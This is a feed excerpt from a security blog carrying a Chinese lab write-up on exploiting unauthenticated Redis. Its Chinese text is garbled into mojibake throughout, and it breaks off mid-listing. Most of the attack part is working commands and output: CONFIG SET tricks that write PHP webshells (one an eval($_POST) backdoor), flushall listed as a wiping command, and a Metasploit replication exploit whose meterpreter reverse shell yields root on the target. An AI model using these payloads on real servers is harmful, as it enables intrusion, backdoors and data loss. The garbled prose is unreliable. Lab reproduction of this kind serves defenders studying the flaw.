&lt;p&gt;Armitage æ˜¯&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;çº¢é˜Ÿè¡ŒåŠ¨&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;çš„&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;åŠ›é‡å€å¢å™¨&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=&quot;&gt;Cobalt Strike&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;æ˜¯ç”¨äº&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==&quot;&gt;å¯¹æ‰‹æ¨¡æ‹Ÿ&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;å’Œ&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=&quot;&gt;çº¢é˜Ÿè¡ŒåŠ¨&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;çš„å·¥å…·é›†ã€‚æˆªè‡³ 2015 å¹´ 10 æœˆï¼ŒCobalt Strike ä¸ä¸ Armitage å…±äº«ä»£ç ï¼Œä¹Ÿä¸ä¾èµ–äº Metasploit æ¡†æ¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Armitage é€šè¿‡ Metasploit æ¼æ´åˆ©ç”¨æ¥è§¦å‘ Cobalt Strike çš„ Beacon æœ‰æ•ˆè½½è·ã€‚æ‚¨è¿˜å¯ä»¥é€šè¿‡ Cobalt Strike Beacon éš§é“ä¼ è¾“ Metasploit æ”»å‡»ã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    <category term="Armitage" scheme="https://lunamoore.github.io/categories/kali/Armitage/"/>
    
    
    <category term="Armitage" scheme="https://lunamoore.github.io/tags/Armitage/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®</title>
    <link href="https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2021-07-19T07:40:38.000Z</published>
    <updated>2021-07-19T08:04:24.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redisæœªæˆæƒè®¿é—®æ¼æ´"><a href="#Redisæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="Redisæœªæˆæƒè®¿é—®æ¼æ´"></a>Redisæœªæˆæƒè®¿é—®æ¼æ´</h1><h2 id="ä¸€ã€æ¼æ´ç®€ä»‹"><a href="#ä¸€ã€æ¼æ´ç®€ä»‹" class="headerlink" title="ä¸€ã€æ¼æ´ç®€ä»‹"></a>ä¸€ã€æ¼æ´ç®€ä»‹</h2><blockquote><p>Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:</p><p>(1)  Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</p><p>(2)  æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡</p></blockquote><a id="more"></a><h2 id="äºŒã€å½±å“èŒƒå›´"><a href="#äºŒã€å½±å“èŒƒå›´" class="headerlink" title="äºŒã€å½±å“èŒƒå›´"></a>äºŒã€å½±å“èŒƒå›´</h2><p>Redis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.x</p><h2 id="ä¸‰ã€æ¼æ´å±å®³"><a href="#ä¸‰ã€æ¼æ´å±å®³" class="headerlink" title="ä¸‰ã€æ¼æ´å±å®³"></a>ä¸‰ã€æ¼æ´å±å®³</h2><p>(1) æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®,å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®</p><p>(2) æ”»å‡»è€…å¯é€šè¿‡evalæ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶</p><p>(3) å¦‚æœredisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•ç›®æ ‡æœåŠ¡å™¨ </p><h2 id="å››ã€å¤ç°è¿‡ç¨‹"><a href="#å››ã€å¤ç°è¿‡ç¨‹" class="headerlink" title="å››ã€å¤ç°è¿‡ç¨‹"></a>å››ã€å¤ç°è¿‡ç¨‹</h2><blockquote><p>ç¯å¢ƒï¼š</p><p>kaliï¼š192.168.1.7</p><p>redis(centos7)ï¼š192.168.1.9</p></blockquote><h3 id="1-ç¯å¢ƒå®‰è£…"><a href="#1-ç¯å¢ƒå®‰è£…" class="headerlink" title="1.ç¯å¢ƒå®‰è£…"></a>1.ç¯å¢ƒå®‰è£…</h3><p><code>æœ¬æ¬¡ä½¿ç”¨4.0.0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ä»å®˜ç½‘wgetåˆ°æœ¬åœ°</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.0.tar.gz </span><br><span class="line">tar xzf redis-4.0.0.tar.gz</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">å»æ‰ipç»‘å®šï¼Œå…è®¸é™¤æœ¬åœ°å¤–çš„ä¸»æœºè¿œç¨‹ç™»å½•redisæœåŠ¡</span><br><span class="line">(1)bind 127.0.0.1å‰é¢åŠ ä¸Š##å·æ³¨é‡Šæ‰ æˆ–è€…æ›´æ”¹æˆ 0.0.0.0</span><br><span class="line">(2)protected-modeè®¾ä¸ºno</span><br><span class="line"></span><br><span class="line">å¯åŠ¨</span><br><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; keys *</span><br><span class="line">(empty list or set)</span><br><span class="line">192.168.1.9:6379&gt;</span><br></pre></td></tr></table></figure><p><code>æ”»å‡»è€…å¸¸ç”¨å‘½ä»¤</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰info                       æŸ¥çœ‹ä¿¡æ¯     </span><br><span class="line">ï¼ˆ2ï¼‰flushall                 åˆ é™¤æ‰€æœ‰ç¼“å­˜æ•°æ®åº“ï¼š</span><br><span class="line">ï¼ˆ3ï¼‰flushdb                    åˆ·æ–°æ•°æ®åº“</span><br><span class="line">ï¼ˆ4ï¼‰çœ‹æ‰€æœ‰é”®ï¼šKEYS *ï¼Œä½¿ç”¨select numå¯ä»¥æŸ¥çœ‹é”®å€¼æ•°æ®ã€‚</span><br><span class="line">ï¼ˆ5ï¼‰set test &quot;who am i&quot;        è®¾ç½®å˜é‡</span><br><span class="line">ï¼ˆ6ï¼‰config set dir dirpath     è®¾ç½®è·¯å¾„ç­‰é…ç½®</span><br><span class="line">ï¼ˆ7ï¼‰config get dir&#x2F;dbfilename  è·å–è·¯å¾„åŠæ•°æ®é…ç½®ä¿¡æ¯</span><br><span class="line">ï¼ˆ8ï¼‰save                       ä¿å­˜</span><br><span class="line">ï¼ˆ9ï¼‰get                        å˜é‡ï¼ŒæŸ¥çœ‹å˜é‡åç§°</span><br></pre></td></tr></table></figure><h3 id="2-æ¼æ´åˆ©ç”¨"><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.æ¼æ´åˆ©ç”¨"></a>2.æ¼æ´åˆ©ç”¨</h3><h4 id="01-å†™å…¥åé—¨æ–‡ä»¶"><a href="#01-å†™å…¥åé—¨æ–‡ä»¶" class="headerlink" title="01.å†™å…¥åé—¨æ–‡ä»¶"></a>01.å†™å…¥åé—¨æ–‡ä»¶</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# ll shell.php</span><br><span class="line">-rw-r--r--. 1 root root 191 Jul 18 02:19 shell.php</span><br><span class="line">[root@mail tmp]# cat shell.php</span><br><span class="line">REDIS0008â–’      redis-ver4.0.0â–’</span><br><span class="line">redis-bitsâ–’@â–’ctimeâ–’â–’â–’â–’`used-memï¿½â–’</span><br><span class="line">â–’</span><br><span class="line">aof-preambleâ–’â–’repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64â–’</span><br><span class="line">                                                               repl-offsetâ–’â–’webshell&lt;?php phpinfo();?&gt;â–’hŞŒâ–’Sâ–’+,[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><p><code>å¦ä¸€ç§å†™å…¥webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET demo &quot;\n\n\n&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename web.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# cat web.php</span><br><span class="line">REDIS0008â–’      redis-ver4.0.0â–’</span><br><span class="line">redis-bitsâ–’@â–’ctimeâ–’â–’`used-memâ–’Øœ</span><br><span class="line">â–’</span><br><span class="line">aof-preambleâ–’â–’repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64â–’</span><br><span class="line">                                                               repl-offsetâ–’â–’â–’demo#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">                                                                                                                       â–’â–’?â–’â–’/â–’[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><h4 id="02-MSFè¿›è¡Œåˆ©ç”¨"><a href="#02-MSFè¿›è¡Œåˆ©ç”¨" class="headerlink" title="02.MSFè¿›è¡Œåˆ©ç”¨"></a>02.MSFè¿›è¡Œåˆ©ç”¨</h4><p><code>å…±æœ‰5ä¸ªæ¨¡å—å¯ä»¥åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search redis</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/ibm_bigfix_sites_packages_enum           2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum</span><br><span class="line">   1  exploit/windows/browser/ie_createobject                   2006-04-11       excellent  No     MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution</span><br><span class="line">   2  auxiliary/scanner/redis/redis_server                                       normal     No     Redis Command Execute Scanner</span><br><span class="line">   3  auxiliary/gather/redis_extractor                                           normal     Yes    Redis Extractor</span><br><span class="line">   4  auxiliary/scanner/redis/file_upload                       2015-11-11       normal     No     Redis File Upload</span><br><span class="line">   5  auxiliary/scanner/redis/redis_login                                        normal     No     Redis Login Utility</span><br><span class="line">   6  exploit/linux/redis/redis_replication_cmd_exec            2018-11-13       good       Yes    Redis Replication Code Execution</span><br><span class="line">   7  exploit/windows/browser/webex_ucf_newobject               2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow</span><br><span class="line">   8  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)</span><br><span class="line">   9  exploit/windows/email/ms07_017_ani_loadimage_chunksize    2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 9, use 9 or use exploit/windows/email/ms07_017_ani_loadimage_chunksize</span><br></pre></td></tr></table></figure><h5 id="1-exploit-linux-redis-redis-replication-cmd-exec"><a href="#1-exploit-linux-redis-redis-replication-cmd-exec" class="headerlink" title="1.exploit/linux/redis/redis_replication_cmd_exec"></a>1.exploit/linux/redis/redis_replication_cmd_exec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 6</span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/redis/redis_replication_cmd_exec):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   CUSTOM    true             yes       Whether compile payload file during exploiting</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   SRVHOST   192.168.1.7      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT   6379             yes       The local port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.7:4444</span><br><span class="line">[*] 192.168.1.9:6379      - Compile redis module extension file</span><br><span class="line">[+] 192.168.1.9:6379      - Payload generated successfully!</span><br><span class="line">[*] 192.168.1.9:6379      - Listening on 192.168.1.7:6379</span><br><span class="line">[*] 192.168.1.9:6379      - Rogue server close...</span><br><span class="line">[*] 192.168.1.9:6379      - Sending command to trigger payload.</span><br><span class="line">[*] Sending stage (3012548 bytes) to 192.168.1.9</span><br><span class="line">[+] 192.168.1.9:6379      - Deleted ./enfgrk.so</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.7:4444 -&gt; 192.168.1.9:58410) at 2021-07-18 02:37:24 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/root/redis-4.0.0</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 10556 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><h5 id="2-auxiliary-scanner-redis-redis-server"><a href="#2-auxiliary-scanner-redis-redis-server" class="headerlink" title="2.auxiliary/scanner/redis/redis_server"></a>2.auxiliary/scanner/redis/redis_server</h5><p><code>æ­¤æ¨¡å—ç”¨æˆ·æ‰«æ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/redis/redis_server):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   COMMAND   INFO             yes       The Redis command to run</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Found redis with INFO command: $2694\x0d\x0a# Server\x0d\x0aredis_version:4.0.0\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:8f4dd5fce9e38cfa\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 3.10.0-1062.el7.x86_64 x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:4.8.5\x0d\x0aprocess_id:10244\x0d\x0arun_id:ce9cb5cafbefebe80c08eec34aaa9072942ee567\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:3107\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:15980436\x0d\x0aexecutable:/root/redis-4.0.0/redis-server\x0d\x0aconfig_file:/root/redis-4.0.0/redis.conf\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:828920\x0d\x0aused_memory_human:809.49K\x0d\x0aused_memory_rss:8384512\x0d\x0aused_memory_rss_human:8.00M\x0d\x0aused_memory_peak:849320\x0d\x0aused_memory_peak_human:829.41K\x0d\x0aused_memory_peak_perc:97.60%\x0d\x0aused_memory_overhead:815206\x0d\x0aused_memory_startup:765576\x0d\x0aused_memory_dataset:13714\x0d\x0aused_memory_dataset_perc:21.65%\x0d\x0atotal_system_memory:1907818496\x0d\x0atotal_system_memory_human:1.78G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:10.11\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# Persistence\x0d\x0aloading:0\x0d\x0ardb_changes_since_last_save:0\x0d\x0ardb_bgsave_in_progress:0\x0d\x0ardb_last_save_time:1626590065\x0d\x0ardb_last_bgsave_status:ok\x0d\x0ardb_last_bgsave_time_sec:-1\x0d\x0ardb_current_bgsave_time_sec:-1\x0d\x0ardb_last_cow_size:0\x0d\x0aaof_enabled:0\x0d\x0aaof_rewrite_in_progress:0\x0d\x0aaof_rewrite_scheduled:0\x0d\x0aaof_last_rewrite_time_sec:-1\x0d\x0aaof_current_rewrite_time_sec:-1\x0d\x0aaof_last_bgrewrite_status:ok\x0d\x0aaof_last_write_status:ok\x0d\x0aaof_last_cow_size:0\x0d\x0a\x0d\x0a# Stats\x0d\x0atotal_connections_received:8\x0d\x0atotal_commands_processed:19\x0d\x0ainstantaneous_ops_per_sec:0\x0d\x0atotal_net_input_bytes:135811\x0d\x0atotal_net_output_bytes:10866\x0d\x0ainstantaneous_input_kbps:0.00\x0d\x0ainstantaneous_output_kbps:0.00\x0d\x0arejected_connections:0\x0d\x0async_full:0\x0d\x0async_partial_ok:0\x0d\x0async_partial_err:0\x0d\x0aexpired_keys:0\x0d\x0aevicted_keys:0\x0d\x0akeyspace_hits:0\x0d\x0akeyspace_misses:0\x0d\x0apubsub_channels:0\x0d\x0apubsub_patterns:0\x0d\x0alatest_fork_usec:0\x0d\x0amigrate_cached_sockets:0\x0d\x0aslave_expires_tracked_keys:0\x0d\x0aactive_defrag_hits:0\x0d\x0aactive_defrag_misses:0\x0d\x0aactive_defrag_key_hits:0\x0d\x0aactive_defrag_key_misses:0\x0d\x0a\x0d\x0a# Replication\x0d\x0arole:master\x0d\x0aconnected_slaves:0\x0d\x0amaster_replid:17593e6719397e611d460c1dabbc2367aaef7a0c\x0d\x0amaster_replid2:0d01cdc14e2ca06ce5125014632c67982313d816\x0d\x0amaster_repl_offset:0\x0d\x0asecond_repl_offset:1\x0d\x0arepl_backlog_active:0\x0d\x0arepl_backlog_size:1048576\x0d\x0arepl_backlog_first_byte_offset:0\x0d\x0arepl_backlog_histlen:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.68\x0d\x0aused_cpu_user:0.86\x0d\x0aused_cpu_sys_children:0.15\x0d\x0aused_cpu_user_children:0.01\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt;</span><br></pre></td></tr></table></figure><h5 id="3-auxiliary-gather-redis-extractor"><a href="#3-auxiliary-gather-redis-extractor" class="headerlink" title="3.auxiliary/gather/redis_extractor"></a>3.auxiliary/gather/redis_extractor</h5><p><code>è·å–ç‰ˆæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 